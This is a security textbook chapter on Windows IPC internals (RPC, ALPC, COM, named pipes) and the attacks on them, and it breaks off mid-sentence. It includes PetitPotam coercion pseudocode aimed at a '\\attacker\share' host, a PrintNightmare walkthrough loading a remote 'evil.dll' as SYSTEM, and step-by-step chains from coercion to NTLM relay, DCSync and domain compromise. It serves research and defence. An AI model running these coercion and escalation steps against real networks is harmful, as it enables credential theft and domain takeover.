# Chapter 05 — RPC, COM, ALPC, and Named Pipes: IPC Security Internals and Attack Patterns

> **Scope:** This chapter covers Windows inter-process communication (IPC) mechanisms as security
> research subjects. Topics span the full stack from named pipe file objects in the kernel through
> ALPC port objects, the RPC runtime, and the COM object model. Attack patterns include endpoint
> enumeration, privilege coercion via impersonation, authentication coercion across the network,
> the root cause analysis of PrintNightmare as a synthesis case study, and 2024–2025 developments
> including new coercion techniques, ALPC hardening bypasses, and COM activation bypasses.

---

## 1. The Four-Layer IPC Stack

Windows IPC is not a single mechanism — it is a stack of four distinct layers, each adding
security semantics on top of the layer below. Every major IPC-based vulnerability lives at
exactly one layer of this stack, and fixing it requires understanding which layer failed.

```
┌─────────────────────────────────────────────────────────────────────┐
│  LAYER 4: COM OBJECT MODEL                                           │
│  CoCreateInstance, class factories, DCOM activation, elevation       │
│  Security controls: LaunchPermission SD, AccessPermission SD,        │
│  RunAs identity, authentication/impersonation levels per-call        │
└─────────────────────────────────┬───────────────────────────────────┘
                                  ↓
┌─────────────────────────────────────────────────────────────────────┐
│  LAYER 3: RPC RUNTIME (MSRPC)                                        │
│  Interface UUID, binding handle, NDR marshaling, security callback   │
│  Security controls: AuthenticationLevel, ImpersonationLevel,         │
│  per-interface security callback, endpoint DACL                      │
└──────────────┬──────────────────┬──────────────────────────────────┘
               ↓                  ↓                        ↓
┌──────────────────┐  ┌───────────────────┐  ┌───────────────────────┐
│  ncalrpc         │  │  ncacn_np         │  │  ncacn_ip_tcp         │
│  (ALPC kernel)   │  │  (Named Pipe)     │  │  (TCP socket)         │
└──────────────────┘  └───────────────────┘  └───────────────────────┘
               ↓                  ↓
┌─────────────────────────────────────────────────────────────────────┐
│  LAYER 1: NT KERNEL                                                  │
│  ALPC port objects (_ALPC_PORT), Named Pipe file objects             │
│  Security controls: object security descriptor (DACL/SACL),         │
│  mandatory integrity check on port connection                        │
└─────────────────────────────────────────────────────────────────────┘
```

**Mental model for attack research:** To exploit a target service, you need to
(a) reach the service at the transport layer (ALPC port or named pipe DACL must permit your
connection), then (b) authenticate at the RPC layer (authentication level), then (c) have
the COM activation or RPC access check succeed. A bug at *any* layer creates an attack surface.

---

## 2. RPC Architecture: Client, Server, Stubs, and NDR

### 2.1 Interface Definition and NDR Marshaling

An RPC interface is defined in IDL (Interface Definition Language). The MIDL compiler produces:
- **Client stub**: serializes (marshals) call arguments into NDR wire format, sends them
- **Server stub**: deserializes arguments from NDR format, dispatches to the implementation
- **Header file**: shared type definitions

NDR (Network Data Representation) is the binary serialization format. NDR type definitions are
embedded in the compiled stubs and referenced at runtime by a pointer in the RPC dispatch table
(`MIDL_SERVER_INFO → pTransferSyntax`).

**Security implication of NDR:** Bugs in NDR deserialization (integer overflow in array size
calculation, type confusion in union variants, pointer validation) have historically produced
exploitable memory corruption in the RPC server. These are server-side parse bugs triggered by
malformed client packets — the attack surface is the NDR wire format.

### 2.2 RPC Security: Authentication Levels

The RPC runtime supports six authentication levels, applied per-binding handle:

| Constant | Value | What is Protected |
|---|---|---|
| `RPC_C_AUTHN_LEVEL_NONE` | 1 | Nothing — fully anonymous |
| `RPC_C_AUTHN_LEVEL_CONNECT` | 2 | Connection establishment only |
| `RPC_C_AUTHN_LEVEL_CALL` | 3 | Each call header |
| `RPC_C_AUTHN_LEVEL_PKT` | 4 | All packets (authenticity) |
| `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY` | 5 | All packets (signing) |
| `RPC_C_AUTHN_LEVEL_PKT_PRIVACY` | 6 | All packets (signing + encryption) |

**Research implication:** Interfaces configured with `NONE` or `CONNECT` can be called without
valid credentials. During the PrintNightmare era (2021), `MS-RPRN` accepted calls with
`RPC_C_AUTHN_LEVEL_NONE` from domain users — a key reason unauthenticated exploitation was
initially possible.

### 2.3 RPC Security: Impersonation Levels

| Constant | What the Server Can Do |
|---|---|
| `RPC_C_IMP_LEVEL_ANONYMOUS` | Server cannot identify caller |
| `RPC_C_IMP_LEVEL_IDENTIFY` | Server reads token (SID, groups) but cannot use it |
| `RPC_C_IMP_LEVEL_IMPERSONATE` | Server can fully impersonate caller locally |
| `RPC_C_IMP_LEVEL_DELEGATE` | Server can impersonate caller on other machines (Kerberos) |

**Attack direction is reversed from intuition:** The server impersonating the client does NOT
gain elevation. A SYSTEM server impersonating a standard-user client receives a standard-user
token — a *downgrade*. The attack model is different: the *attacker acts as the server*, and
the *victim is the client*. When a privileged client calls an attacker's server at
`IMPERSONATE` level, the attacker's server calls `RpcImpersonateClient()` and obtains the
privileged token. This is the basis of all named-pipe impersonation attacks (PrintSpoofer,
RoguePotato, etc.).

### 2.4 Security Callback

An RPC server can register a **security callback** function for each interface:

```c
RPC_STATUS CALLBACK SecurityCallback(
    RPC_IF_HANDLE Interface,
    void *Context)
{
    RPC_CALL_ATTRIBUTES_V2 attrs = { .Version = 2 };
    RpcServerInqCallAttributes(Context, &attrs);

    // Check authentication level
    if (attrs.AuthenticationLevel < RPC_C_AUTHN_LEVEL_PKT_INTEGRITY)
        return RPC_S_ACCESS_DENIED;

    // Check caller identity
    // ... ImpersonateClient() → GetTokenInformation() → RevertToSelf()

    return RPC_S_OK;  // Allow
}

RpcServerRegisterIfEx(MyInterface_v1_0_s_ifspec,
    NULL, NULL,
    RPC_IF_ALLOW_CALLBACKS_WITH_NO_AUTH,
    RPC_C_LISTEN_MAX_CALLS_DEFAULT,
    SecurityCallback);
```

The security callback is the primary per-interface access control mechanism. A missing or
incorrect security callback is the first thing to look for when auditing an RPC server.

### 2.5 Enumerating Live RPC Endpoints

Using NtObjectManager (PowerShell):

```powershell
# Enumerate all RPC servers currently running (parses loaded modules in all processes)
$servers = Get-RpcServer -ParseProcess

# Show servers with no authentication requirement
$servers | Where-Object { $_.AuthType -eq 'None' -or $_.AuthLevel -le 2 }

# Get endpoints for a specific interface UUID
Get-RpcEndpoint -InterfaceId "12345778-1234-abcd-ef00-0123456789ab"

# Check who can call a specific ncalrpc endpoint
$ep = Get-RpcEndpoint | Where-Object { $_.Endpoint -like "*spoolss*" }
Get-AccessibleRpcEndpoint -Endpoint $ep
```

Using RpcView (GUI):
1. Launch RpcView as Administrator
2. "Processes" tab → select target process → shows all registered interfaces
3. Right-click interface → "Decompile" → generates approximate IDL
4. Cross-reference UUID with Microsoft protocol documentation

**Audit priority:** Interfaces with `AuthenticationLevel = None/Connect` that run as SYSTEM
or LocalService are the highest-priority targets. Every such interface is a potential LPE if
it accepts user-influenced parameters.

### 2.6 Notable RPC CVEs (2024)

**CVE-2024-26229 — Windows CSC Service RPC LPE (CVSS 7.8, patched March 2024)**

The Client-Side Caching (CSC) service exposed an RPC interface with insufficient input
validation. A local attacker with standard user privileges could send a crafted RPC request
to trigger a privilege escalation to SYSTEM. Patched in the March 2024 Patch Tuesday cycle.

```powershell
# Identify if CSC service RPC interface is exposed
Get-RpcServer -ParseProcess | Where-Object { $_.FilePath -like "*csc*" }
```

**CVE-2024-43639 — Windows Kerberos RCE (Critical, November 2024)**

A critical remote code execution vulnerability in the Windows Kerberos implementation.
Specially crafted Kerberos protocol messages could trigger memory corruption in the
Kerberos server-side code path. CVSS rated Critical; attackers with network access to a
Kerberos server could achieve unauthenticated RCE.

```
Attack path:
  Attacker → crafted Kerberos AS-REQ/TGS-REQ packet → Windows KDC
  → memory corruption in Kerberos PDU parsing
  → arbitrary code execution as SYSTEM on DC
```

---

## 3. ALPC Internals

### 3.1 Port Object Hierarchy

ALPC (Advanced Local Procedure Call) is the kernel-mode IPC primitive underlying all local
RPC calls (`ncalrpc`), COM inter-process calls, and many Windows system services.

Three distinct port object types:

```
NtAlpcCreatePort("\RPC Control\MyServer", SD)
  → Creates: SERVER PORT (_ALPC_PORT, Type=Server)
    Security descriptor SD controls: who can CONNECT

NtAlpcConnectPort("\RPC Control\MyServer", ...)
  → Creates (atomically):
    CONNECTION PORT (_ALPC_PORT, Type=Connection) — server-side per-client
    COMMUNICATION PORT (_ALPC_PORT, Type=Communication) — client-side
    
NtAlpcSendWaitReceivePort(...)
  → Sends/receives messages through the communication ports
    Messages carry: data payload + optional port attributes
```

Object namespace path for RPC-created ALPC ports: `\RPC Control\<EndpointName>`

### 3.2 ALPC Message Attributes

ALPC messages can carry structured **port message attributes** beyond the raw data payload.
These attributes are the mechanism for rich IPC semantics:

| Attribute Type | Purpose | Security Implication |
|---|---|---|
| **SecurityAttribute** | Client security context (token reference) | Server calls `NtAlpcImpersonateClientOfPort()` to impersonate |
| **ViewAttribute** | Shared memory section mapping | Bypasses per-message size limits; content must be validated by server |
| **HandleAttribute** | Kernel handle passing | Server receives a handle to a kernel object in client's table |
| **ContextAttribute** | Client-defined context handle | Correlates requests in stateful protocols |
| **DirectAttribute** | Direct memory access | Fast path for large data |

**Security implications:**
- **SecurityAttribute**: If a server impersonates via `NtAlpcImpersonateClientOfPort()`, it
  gains the client's token. This is safe for SYSTEM→user (downgrade), but dangerous if
  abused (attacker server, privileged client).
- **HandleAttribute**: A client can pass a handle to any object it can open. The server
  receives a handle to that same object in the server's process. This is the mechanism
  for cross-process handle duplication without `DuplicateHandle`.
- **ViewAttribute**: Shared memory mapped via ALPC means the client can modify the
  "received" data while the server is processing it — a TOCTOU if the server reads
  fields twice.

### 3.3 ALPC Security: Port Security Descriptor

When a server creates an ALPC port, it specifies a security descriptor controlling who can
**connect** to the port. If the SD allows `Everyone: ALPC_PORT_CONNECT`, any process can
connect regardless of integrity level.

```powershell
# Check ALPC port security descriptor
$port = Get-NtAlpcServer -Path \RPC Control\MyServer
Get-NtSecurityDescriptor -Object $port | Show-NtSecurityDescriptor

# Enumerate all ALPC ports accessible to current user
Get-AccessibleAlpcPort -Path \RPC Control
```

An ALPC port with a permissive SD that connects to a privileged server is an attack surface:
a low-integrity (sandboxed) process may be able to communicate with a SYSTEM service if the
port SD has no integrity level restriction.

### 3.4 WinDbg ALPC Analysis

```windbg
; List all ALPC ports in the system
!alpc /p <process_addr>

; Dump an ALPC port object
dt nt!_ALPC_PORT <addr>

; Show ALPC connections for a process
!alpc /lpc <eprocess_addr>

; Inspect port security descriptor
dt nt!_ALPC_PORT <addr> SecurityDescriptor
```

### 3.5 ALPC Race Condition and Recent Vulnerabilities

**CVE-2024-30088 — Windows Kernel ALPC Race Condition (CVSS 7.0, June 2024)**

A race condition in the ALPC message handling path allowed a local attacker to escalate
to SYSTEM. The vulnerability involved a time-of-check/time-of-use (TOCTOU) race in the
kernel's handling of ALPC port connection requests when concurrent messages were in flight.

```
Root cause pattern:
  Thread A: NtAlpcSendWaitReceivePort → message queued in port object
  Thread B: concurrent port disconnect / reconnect
  Race window: port object reference count manipulation → use-after-free
  → kernel memory corruption → SYSTEM code execution
```

**"Ghost Pipe" Technique — ALPC Port Hijacking + Named Pipe Spoofing**

A research technique (2024) combining ALPC port hijacking with named pipe spoofing to
intercept IPC traffic from privileged services. The technique exploits the window between
when a service creates its ALPC port name in the object namespace and when it begins
accepting connections:

```
1. Monitor \RPC Control\ object namespace for new port creation events
   (use NtNotifyChangeKey or ETW provider)
2. Race: before the legitimate server calls NtAlpcCreatePort,
   attacker creates a port with the same name
3. Legitimate client connects to attacker's port
4. Attacker receives connection → NtAlpcImpersonateClientOfPort()
   → privileged token from the connecting service
```

**NtAlpcSendWaitReceivePort Bypass (SpecterOps/MDSec research)**

Windows Server 2025 introduced stricter named pipe security with mandatory integrity
level checks. Researchers at SpecterOps and MDSec documented that undocumented parameters
of `NtAlpcSendWaitReceivePort` can be used to bypass these checks by routing ALPC
messages through alternative message attribute paths that do not go through the new
integrity-level validation code:

```
Windows Server 2025 hardening:
  - Mandatory integrity level checks on pipe connections (Low cannot connect to Medium+)
  - Restricted anonymous pipe access (anonymous tokens blocked on named pipes)
  - New ETW telemetry on pipe creation events

Bypass via ALPC callback abuse:
  - Direct ALPC calls using undocumented PortAttribute flags
  - Bypass the named pipe driver layer entirely
  - Connect to underlying ALPC port of ncalrpc-based pipes
```

---

## 4. COM Activation and Security Model

### 4.1 CoCreateInstance Activation Flow

When user code calls `CoCreateInstance(clsid, ...)`:

```
1. COM runtime queries HKCR\CLSID\{clsid}
   → InprocServer32 (DLL path) OR LocalServer32 (EXE path)
   → AppID reference (optional)

2. If InprocServer32: load DLL into calling process
   Security implication: DLL path from registry → DLL hijacking if path writable

3. If LocalServer32 (out-of-process server):
   a. SCM (Service Control Manager) or DCOM activation:
      → Check AppID's LaunchPermission SD: can caller launch the server?
      → If server is not running: create process with RunAs identity
        (RunAs = "Interactive User", "System", or specific account)
      → If server is already running: attach

4. Once server process runs:
   → Check AppID's AccessPermission SD: can caller call methods?
   → Negotiation of authentication level (AUTHN_LEVEL_xxx)

5. Interface proxy/stub marshaling:
   → Create proxy in client process, stub in server process
   → All calls go through DCOM marshal/unmarshal
```

### 4.2 COM Security Configuration in the Registry

```
HKCR\AppID\{app-guid}\
  ├── RunAs          REG_SZ  "Interactive User" | "NT Authority\SYSTEM" | ".\Username"
  ├── LaunchPermission   REG_BINARY  [DACL-format security descriptor]
  ├── AccessPermission   REG_BINARY  [DACL-format security descriptor]
  └── AuthenticationLevel  REG_DWORD  [RPC_C_AUTHN_LEVEL_xxx]
```

**Attack surface audit:**
```powershell
# Find COM servers running as SYSTEM with permissive launch permissions
Get-ChildItem HKLM:\SOFTWARE\Classes\AppID | ForEach-Object {
    $appid = $_
    $runas = (Get-ItemProperty $appid.PSPath -ErrorAction SilentlyContinue).RunAs
    if ($runas -eq "NT Authority\SYSTEM") {
        [PSCustomObject]@{
            AppID  = $appid.PSChildName
            RunAs  = $runas
            Launch = (Get-ItemProperty $appid.PSPath).LaunchPermission
        }
    }
}

# OleViewDotNet (Forshaw's GUI tool):
# Launch OleViewDotNet → COM Objects → sort by Security → look for
# LaunchPermission that includes Everyone or Authenticated Users
```

### 4.3 COM Impersonation Levels and Attack Surface

When a COM server receives a call, it can impersonate the caller's security context.
The impersonation level is negotiated at client connection time:

```c
// Client specifies impersonation level when connecting
CoInitializeSecurity(NULL, -1, NULL, NULL,
    RPC_C_AUTHN_LEVEL_CALL,
    RPC_C_IMP_LEVEL_IMPERSONATE,  // ← server can act as us
    NULL, EOAC_NONE, NULL);
```

If the COM server is an attacker-controlled out-of-process server and the *victim* is a
privileged COM client (e.g., a SYSTEM service that calls into an attacker-registered CLSID),
the attacker's server can:

1. Receive the COM method call
2. Call `CoImpersonateClient()` (maps to `RpcImpersonateClient()` internally)
3. Obtain the calling thread's impersonation token
4. Token is SYSTEM (or the service's identity) → privilege escalation

This is the COM-server attack model: register a CLSID that a privileged process calls, then
impersonate when the call arrives.

### 4.4 COM Elevation Moniker and Auto-Elevation

Windows Vista+ introduced the **elevation moniker** for requesting elevated COM objects
without requiring the server to run as SYSTEM:

```
"Elevation:Administrator!new:{CLSID}"
```

This triggers a UAC elevation dialog. However, a small set of Microsoft-approved CLSIDs are
marked for **auto-elevation** — they elevate without a prompt:

```powershell
# Enumerate auto-elevated CLSIDs
Get-ChildItem "HKLM:\SOFTWARE\Classes\CLSID" -Recurse |
  Where-Object { $_.GetValue("AutoElevate") -eq 1 } |
  Select-Object PSPath
```

Auto-elevated COM objects have been a rich UAC bypass source. The attack pattern:
1. Find an auto-elevated COM object with a writable DLL search path
2. The COM activation runs elevated in a DLL surrogate (`dllhost.exe`)
3. Plant a DLL in the search path → DLL loads elevated → code execution at high integrity

### 4.5 COM Activation Security Bypasses (2024–2025)

**CVE-2024-38100 — COM Activation Security Bypass (CVSS 7.8, patched July 2024)**

A vulnerability in the COM activation pipeline allowed bypassing AppID
`LaunchPermission`/`AccessPermission` checks in specific activation paths. An attacker with
standard user access could activate COM servers configured to run as SYSTEM without
satisfying the configured DACL, leading to privilege escalation.

```
Root cause: COM activation codepath in rpcss.dll did not apply LaunchPermission
            check uniformly across all activation paths — the "in-session" activation
            path for certain LocalServer32 entries skipped the AppID security descriptor
            validation when the target process was already running.
```

**CVE-2025-21377 — NTLM Hash Disclosure via COM Object Instantiation (CVSS 6.5, Feb 2025)**

A subtle vulnerability: instantiating certain COM objects caused the Windows system to
initiate an NTLM authentication to an attacker-controlled UNC path embedded in a COM
object's registry configuration. This allowed hash capture without any explicit network call:

```powershell
# Attacker sets up NTLM capture listener (e.g., Responder)
# Then tricks a victim into instantiating a specific COM class
# The COM activation code reads a registry key pointing to \\attacker\share
# Windows initiates NTLM auth → NTLMv2 hash captured → offline crack or relay
```

**"The COM-Back" (Google Project Zero, January 2025)**

James Forshaw documented a technique to bypass COM activation security via out-of-process
COM server activation. The technique leverages the way COM handles activation requests when
a server object is already registered but running in a lower-integrity context:

```
Attack flow:
1. Register a low-privileged COM server that implements the target CLSID
2. Trigger a high-privileged process to instantiate the CLSID via CoCreateInstance
3. The COM infrastructure routes the activation to the already-running low-privileged server
   instead of launching a new elevated server
4. High-privileged caller connects to attacker-controlled server at IMPERSONATE level
5. Attacker calls CoImpersonateClient() → privileged token

Key bypass: COM activation "adopt running server" logic does not re-validate
            LaunchPermission/AccessPermission against the running server's actual identity
```

Reference: https://googleprojectzero.blogspot.com/2025/01/

**COM Surrogate Injection — DllHost.exe Abuse**

COM Surrogate (`DllHost.exe`) hosts out-of-process COM servers for InprocServer32 DLLs
when surrogate activation is configured. If a SYSTEM-level COM server uses a surrogate,
an attacker can:

1. Identify the surrogate via `HKCR\AppID\{guid}\DllSurrogate` key
2. Find writable DLL paths in the surrogate's search order
3. Plant a malicious DLL → loaded by `DllHost.exe` running as elevated identity

```powershell
# Find COM objects using DllSurrogate with elevated identity
Get-ChildItem HKLM:\SOFTWARE\Classes\AppID | ForEach-Object {
    $surr = (Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue).DllSurrogate
    $runas = (Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue).RunAs
    if ($surr -ne $null -and $runas -ne $null) {
        [PSCustomObject]@{
            AppID     = $_.PSChildName
            RunAs     = $runas
            Surrogate = $surr
        }
    }
}
```

**DCOM Hardening Bypass (Rapid7, October 2024)**

Microsoft released KB5004442 in 2021 to harden DCOM activation by enforcing authentication
levels. Rapid7 researchers identified that legacy COM activation code paths — specifically
those triggered by certain application compatibility shims and pre-Vista COM activation
APIs — bypass the KB5004442 hardening checks:

```
KB5004442 hardening: Enforces RPC_C_AUTHN_LEVEL_PKT_INTEGRITY minimum for DCOM
Legacy bypass path: Activate via IClassFactory::CreateInstance using pre-Vista
                    activation context flags → hardening check not applied
Result: DCOM connections at AUTH_LEVEL_NONE still possible against certain servers
```

Reference: https://www.rapid7.com/blog/post/2024/10/

---

## 5. Named Pipe Security

### 5.1 Pipe Namespace and Object Manager Integration

```
Win32 path:        \\.\pipe\PipeName
NT object path:    \Device\NamedPipe\PipeName
RPC control path:  \RPC Control\PipeName  (for RPC-created pipes)
```

Named pipes are file objects in the NTFS driver stack, but the device object backing them
is `\Device\NamedPipe` — a driver created by the named pipe filesystem driver (`npfs.sys`),
not NTFS. Pipes do not exist on disk; they are purely in-memory objects.

### 5.2 Pipe DACL: Critical Access Rights

`CreateNamedPipe` accepts a `SECURITY_ATTRIBUTES` parameter specifying the pipe's DACL.
Key access rights:

| Right | Constant | Meaning |
|---|---|---|
| Read Data | `FILE_READ_DATA` | Client can read server's output; server can read client's input |
| Write Data | `FILE_WRITE_DATA` | Client can write to server; server can write to client |
| Create Pipe Instance | `FILE_CREATE_PIPE_INSTANCE` | Who can create additional server-side instances |
| Synchronize | `SYNCHRONIZE` | Required for blocking operations |

**The `FILE_CREATE_PIPE_INSTANCE` right is the squatting defense.** If the pipe is created
with a DACL that denies `Everyone: FILE_CREATE_PIPE_INSTANCE` and only grants it to SYSTEM,
a user-mode process cannot create a second instance to compete with the server.

### 5.3 Named Pipe Squatting Attack

```
PRECONDITION: A privileged service creates \\.\pipe\TargetPipe
              and connects clients after creating it.

ATTACK (race-based):
  1. Attacker calls CreateNamedPipe("\\.\pipe\TargetPipe", PIPE_ACCESS_DUPLEX,
         PIPE_TYPE_BYTE | PIPE_READMODE_BYTE,
         10,        // max instances — allow competing instances
         4096, 4096, 0, NULL)
     This succeeds if the first instance hasn't been created yet.

  2. Attacker calls ConnectNamedPipe() — waits for a client

  3. Privileged service (SYSTEM) creates its instance:
     - If the pipe already has an instance from the attacker, the SYSTEM
       service gets a second instance, NOT the attacker's
     - BUT: the first client to connect may connect to the attacker's instance

  4. A client (possibly the SYSTEM service itself) connects to attacker's pipe

  5. Attacker calls ImpersonateNamedPipeClient(hPipe)
     → Receives the client's token (may be SYSTEM)

  6. With the SYSTEM token: SeImpersonatePrivilege → CreateProcessWithToken() → LPE

DEFENSE CHECK: Does the pipe's DACL restrict FILE_CREATE_PIPE_INSTANCE?
  Get-NtFile -Path "\Device\NamedPipe\TargetPipe" | Get-NtSecurityDescriptor
```

### 5.4 ImpersonateNamedPipeClient Mechanics

`ImpersonateNamedPipeClient(hPipe)` calls `NtFsControlFile` with
`FSCTL_PIPE_IMPERSONATE`. The named pipe filesystem driver retrieves the connecting
client's security context (stored when the client called `CreateFile` to connect) and
sets it as the calling thread's impersonation token.

**Requirements for the attack to yield a useful token:**
1. The client must have connected with `SECURITY_IMPERSONATION` level (default for local pipes)
2. The server must hold `SeImpersonatePrivilege` (granted to SYSTEM, LocalService, NetworkService, and members of the Administrators group by default)
3. The impersonated token must be more privileged than the attacker's token

**Impersonation level check:**
```c
// Server-side: check what level we received before impersonating
RPC_STATUS status = RpcImpersonateClient(NULL);
// Or for named pipes:
if (!ImpersonateNamedPipeClient(hPipe))
    return GetLastError();

HANDLE hToken;
OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &hToken);
SECURITY_IMPERSONATION_LEVEL level;
DWORD size;
GetTokenInformation(hToken, TokenImpersonationLevel, &level, sizeof(level), &size);
// level should be SecurityImpersonation (2) or SecurityDelegation (3) to be useful
```

### 5.5 Windows Server 2025 Named Pipe Security Hardening

Windows Server 2025 introduced significant hardening to the named pipe subsystem, directly
targeting impersonation-based LPE techniques used by tools like PrintSpoofer and RoguePotato:

**New controls added:**

1. **Mandatory integrity level checks on pipe connections**: Low integrity processes can no
   longer connect to Medium+ integrity pipes unless explicitly permitted via the pipe's SACL.
   This blocks sandboxed process escalation via pipe squatting.

2. **Restricted anonymous pipe access**: Anonymous tokens (connection without identity) are
   blocked by default on named pipes. Connects must carry a valid security token.

3. **New ETW telemetry for pipe creation events**: The `Microsoft-Windows-Kernel-File`
   ETW provider now emits events for named pipe creation, including the creating process,
   the pipe name, and the DACL applied. This enables detection of pipe squatting attempts.

```powershell
# Query ETW for named pipe creation events (Windows Server 2025+)
$session = New-NetEventSession -Name "PipeAudit"
Add-NetEventProvider -SessionName "PipeAudit" `
    -Name "Microsoft-Windows-Kernel-File" `
    -MatchAnyKeyword 0x200  # File create events
# Filter for NamedPipe operations in post-processing
```

**Bypass research (SpecterOps/MDSec, 2024):**

The hardening can be bypassed via ALPC callback abuse. By communicating directly with the
underlying ALPC port of an ncalrpc-based named pipe (bypassing the `npfs.sys` layer), an
attacker can avoid the new integrity-level checks that are enforced only at the
`CreateFile` → `npfs.sys` connection path:

```
Hardening enforcement point: npfs.sys IoCreateFile handler
Bypass path: NtAlpcConnectPort → \RPC Control\<pipe-name>
             → directly reaches RPC server's ALPC port
             → integrity check not applied at ALPC layer in Server 2025 RTM
```

---

## 6. Authentication Coercion: Forcing Outbound Authentication

### 6.1 The Pattern

All authentication coercion bugs share one structural pattern:

```
1. Attacker calls an RPC method on a VICTIM SERVER
2. The method accepts a path parameter controlled by the attacker
3. The server's implementation opens that path (UNC or local)
4. Opening a UNC path → Windows issues NTLM or Kerberos authentication
   to the UNC host
5. Attacker's machine receives the authentication attempt
6. Attacker relays the authentication to:
   - LDAP  → modify AD objects (add machine accounts, set RBCD, etc.)
   - AD CS → request certificate → pass-the-certificate → DA
   - SMB   → code execution (if SMB signing disabled)
```

**Why it is exploitable:** The authentication is sent from the victim server's machine
account or service account — a high-privilege credential. An attacker with any domain user
account can trigger this against domain controllers or high-value servers.

### 6.2 Coercible Interfaces Reference Table (2025)

| Interface | Protocol Spec | Auth Requirement | Trigger Method | Status (2025) |
|---|---|---|---|---|
| **MS-RPRN** Print Spooler | MS-RPRN | Domain user | `RpcRemoteFindFirstPrinterChangeNotification` | Coercion still works; DLL injection patched |
| **MS-EFSR** EFS Remote | MS-EFSR | None (pre-patch); domain user (post-patch) | `EfsRpcOpenFileRaw` | Unauth variant patched (CVE-2021-36942); authenticated still works |
| **MS-DFSNM** DFS Namespace | MS-DFSNM | Domain user | `NetrDfsRemoveStdRoot`, `NetrDfsAddStdRoot` | Still functional (DFSCoerce) |
| **MS-FSRVP** Shadow Copy | MS-FSRVP | Typically domain admin | `IsPathSupported`, `IsPathShadowCopied` | Still functional (ShadowCoerce), high-priv only |
| **MS-PAR** Print Async | MS-PAR | Domain user | Various async notification methods | Still functional |
| **DCOM Activation** | MS-DCOM | Domain user | Remote class activation with UNC moniker | 2024 Forshaw research |
| **MS-EVEN6** Event Log | MS-EVEN6 | Domain user | `EvtRpcRegisterRemoteSubscription` | Active/Stealthy — works when Print Spooler disabled |
| **WinReg** Remote Registry | MS-RRP | Domain user | `OpenKey` with UNC path | **Patched Oct 2024** (CVE-2024-43532) |
| **WebDAV Coercion** | WebDAV/HTTP | Domain user | UNC via WebDAV redirector | Active — bypasses SMB signing requirement |

**Coercion Status Summary Table (2025):**

| Technique | Protocol | Local or Remote | Current Status |
|---|---|---|---|
| DFSCoerce | MS-DFSNM | Remote | Active |
| ShadowCoerce | MS-FSRVP | Remote | Active |
| MS-EVEN6 Coercion | EventLog RPC | Remote | Active / Stealthy |
| WebDAV Coercion | WebDAV/HTTP | Remote | Active |
| CoercedPotato | DCOM/RPC local | Local | Active |
| WinReg Relay CVE-2024-43532 | WinReg | Remote | Patched Oct 2024 |
| PetitPotam (authenticated) | MS-EFSR | Remote | Still works (domain user required) |
| PrintSpoofer coercion (RPRN) | MS-RPRN | Remote | Still works |

### 6.3 MS-RPRN Deep Dive (PrintNightmare Root Cause)

MS-RPRN is the Windows Print Spooler's RPC interface. Two separate vulnerabilities were
disclosed simultaneously in 2021 under the "PrintNightmare" label:

**CVE-2021-1675 / CVE-2021-34527 — DLL Injection via AddPrinterDriverEx**

Root cause analysis:

```
STEP 1: Client calls RpcAddPrinterDriverEx(server, environment, driverInfo, dwFileCopyFlags)
        driverInfo.pDriverPath = "\\attacker\share\evil.dll"

STEP 2: Spooler service (SYSTEM) validates the path
        Bug pre-patch: validation occurred but was insufficient —
        it only checked that the UNC path was reachable, not that it was a
        trusted printer driver from a signed source

STEP 3: Spooler calls LoadLibrary("\\attacker\share\evil.dll") as SYSTEM
        → attacker DLL executes as SYSTEM
        → full LPE / RCE

WHY RCE: The MS-RPRN interface is accessible to any domain user, including from
         off-machine. Any domain user could call AddPrinterDriverEx on any machine
         running Print Spooler → SYSTEM code execution remotely.

PATCH: Microsoft added driver package signing requirements and ACL checks.
       The DLL loading path was restricted. However:

RESIDUAL: The COERCION primitive (FindFirstPrinterChangeNotification) was NOT
          removed. Any domain user can still call it to force outbound NTLM/Kerberos
          authentication from the Print Spooler service account.
```

**Why domain user access was the critical design flaw:**
MS-RPRN's security callback historically checked only that the caller was a member of
the domain — a wide group in any Active Directory environment. The interface was designed
for printer sharing and the assumption that domain users were trusted operators. In the
post-Kerberos-relay era, this assumption is wrong.

### 6.4 PetitPotam (CVE-2021-36942): Unauthenticated Coercion

**Interface:** MS-EFSR (Encrypting File System Remote Protocol)

**Trigger:**
```python
# Simplified Python pseudocode (impacket-style)
rpctransport = transport.DCERPCTransportFactory(
    "ncacn_np:target[\\pipe\\lsarpc]")
dce = rpctransport.get_dce_rpc()
dce.connect()
dce.bind(MSRPC_UUID_EFSR)

# EfsRpcOpenFileRaw — accepts UNC path, triggers outbound auth
dce.request(EfsRpcOpenFileRaw_request(
    FileName="\\\\attacker\\share\\trigger"
))
```

**Chain to domain compromise:**
```
1. Attacker (no credentials) → calls EfsRpcOpenFileRaw on DC
2. DC (machine account) → authenticates NTLM to attacker
3. Attacker relays NTLM to AD CS HTTP enrollment endpoint
4. Attacker requests certificate for DC machine account
5. Certificate → PKINIT (Kerberos AS-REQ with certificate) → TGT for DC$
6. With DC$ TGT → DCSync → extract all domain hashes → DA
```

**Patch status:**
- Microsoft added authentication requirement to the MS-EFSR interface (Sept 2021)
- Unauthenticated coercion is patched
- Authenticated coercion (valid domain user) still functions in many environments
- PetitPotam with domain user credentials remains a valid coercion technique

### 6.5 CVE-2024-43532 — Windows Remote Registry NTLM Coercion

**Vulnerability:** The Windows Remote Registry service (MS-RRP) accepted RPC calls that
triggered NTLM authentication to an attacker-controlled UNC path. This allowed an
attacker to coerce the victim server's machine account NTLM hash and relay it to AD CS
for a certificate-based domain compromise.

- **Reporter:** Akamai Security Research, October 2024
- **CVSS:** 8.8 (High)
- **Patched:** October 2024 Patch Tuesday

```
Attack chain:
  1. Attacker (domain user) → WinReg RPC to victim server
     Call: OpenKey(HKEY_LOCAL_MACHINE, "\\attacker\share\trigger")
  2. Remote Registry service (runs as NT AUTHORITY\SYSTEM) opens UNC path
  3. NTLM authentication issued from victim's machine account → attacker
  4. Attacker relays NTLM to AD CS Web Enrollment (if ESC8 present)
  5. Certificate issued for victim machine account
  6. Certificate → PKINIT → machine TGT → DCSync / Silver Ticket → DA
```

**Detection:**
```powershell
# Check if Remote Registry service is running (required for attack)
Get-Service RemoteRegistry | Select-Object Status

# Monitor Event ID 4624 (logon) with LogonType=3 (network) from unexpected sources
# Also: Event ID 4769 (Kerberos service ticket request) for anomalous machine accounts
```

### 6.6 MS-EVEN6 Coercion (EventLog RPC)

The `MS-EVEN6` protocol (Windows Event Log Remoting Protocol) provides a stealthy
